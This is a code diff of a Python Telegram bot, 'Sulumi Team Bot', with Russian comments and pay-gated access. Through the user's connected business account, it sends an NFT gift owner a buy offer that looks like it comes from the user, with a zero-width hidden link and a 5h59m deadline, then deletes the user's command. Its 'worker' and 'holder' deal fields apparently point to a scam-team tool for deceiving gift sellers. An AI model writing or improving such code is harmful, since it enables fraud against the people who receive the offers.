@@ -1,5 +1,5 @@
 """
-Sulumi Team Bot — P2P Direct Message Version
+Sulumi Team Bot — Final P2P Version
 """
 
 import os
@@ -173,11 +173,6 @@ def pnft(t):
     gn = re.sub(r'([a-z])([A-Z])', r'\1 \2', np2)
     return {"slug": s, "name": gn, "num": num, "nfmt": fmt(num)}
 
-def goname(msg):
-    u = msg['from'].get('username')
-    f = msg['from'].get('first_name')
-    return "@" + u if u else (f if f else "who?")
-
 # ==================== ОБРАБОТЧИКИ ====================
 def handle_message(msg):
     cid = msg["chat"]["id"]
@@ -185,11 +180,13 @@ def handle_message(msg):
     mid = msg.get("message_id")
     ci = msg.get("business_connection_id")
 
+    # Сохраняем business_connection_id пользователя
     if ci:
         bconns[uid] = ci
 
     txt = (msg.get("text") or "").strip()
 
+    # 1. Обработка смены держателя
     if uid in wholder:
         un = txt.lstrip("@").lower()
         if un and " " not in un:
@@ -200,11 +197,14 @@ def handle_message(msg):
             sm(cid, "❌ Неверный формат. Напишите username без @", bci=ci)
         return
 
+    # 2. Проверка доступа для команд
     if txt.startswith("/") and uid not in allowed:
         sm(cid, f"🔒 <b>Доступ закрыт</b>\n\n💰 <b>@{PAYMENT}</b>", bci=ci)
         return
 
-    if not txt.startswith("/"): return
+    # 3. ИГНОРИРОВАНИЕ обычных сообщений (никаких "ало")
+    if not txt.startswith("/"): 
+        return
 
     if txt == "/start":
         cmd_text = f"""✨ <b>Sulumi Team Bot</b>
@@ -249,32 +249,36 @@ def handle_message(msg):
         cs = ce("stars", "⭐") if s["cur"] == "stars" else ce("grams", "💎")
         did = str(uuid.uuid4())[:8]
         
-        buyer_bci = ci or bconns.get(uid)
-        if not buyer_bci:
+        # ВАЖНО: Берем business_connection_id ТОГО, кто написал команду
+        sender_bci = ci or bconns.get(uid)
+        if not sender_bci:
             sm(cid, "⚠️ <b>Ты не подключил бизнес-аккаунт к боту!</b>\n\nПодключи через @BotFather → Business → Connect Business Account, чтобы бот мог писать от твоего имени.", bci=ci)
             return
 
         deals[did] = {
             "wid": uid, "lid": cid, "slug": ni["slug"], "name": ni["name"],
             "num": ni["num"], "price": pr, "cur": s["cur"], "hold": s["hold"], 
-            "st": "pending", "bci": buyer_bci
+            "st": "pending", "bci": sender_bci
         }
 
         nl = "https://t.me/nft/" + ni["slug"]
-
         hidden = '<a href="' + nl + '">\u200b</a>'
-        caption = hidden + f"Предлагаю <b>{pr}</b> {cs} за ваш подарок <b>{ni['name']} #{ni['nfmt']}</b>.\n\nУ вас есть <b>5h 59m</b>, чтобы принять решение."
+        
+        # Используем first_name отправителя, но сообщение все равно идет от его аккаунта благодаря sender_bci
+        sender_name = msg['from'].get('first_name') or msg['from'].get('username') or "Пользователь"
+        caption = hidden + f"<b>{sender_name}</b> предлагает <b>{pr}</b> {cs} за ваш подарок <b>{ni['name']} #{ni['nfmt']}</b>.\n\nУ вас есть <b>5h 59m</b>, чтобы принять решение."
 
-        result = sm_nft(cid, caption, nl, kb=okb(did), bci=buyer_bci)
+        # Отправляем в тот же чат (cid), откуда пришла команда, от лица отправителя (sender_bci)
+        result = sm_nft(cid, caption, nl, kb=okb(did), bci=sender_bci)
         
         if result.get("ok"):
-            # Удаляем сообщение с командой пользователя после успешной отправки
-            if mid:
+            # АВТОУДАЛЕНИЕ команды после успешной отправки
+            if mid and ci:
                 dm(cid, mid, bci=ci)
         else:
             err = result.get("description", "err").lower()
             if "business_peer_usage_missing" in err:
-                sm(cid, "❌ Ошибка: бот не может писать в этот чат. Убедись, что ты пишешь команду в ЛС продавцу.", bci=ci)
+                sm(cid, "❌ Ошибка: бот не может писать в этот чат. Убедись, что ты пишешь команду в ЛС продавцу, и что у тебя подключен бизнес-аккаунт.", bci=ci)
             else:
                 sm(cid, f"❌ Ошибка: {result.get('description', 'err')}", bci=ci)
         return
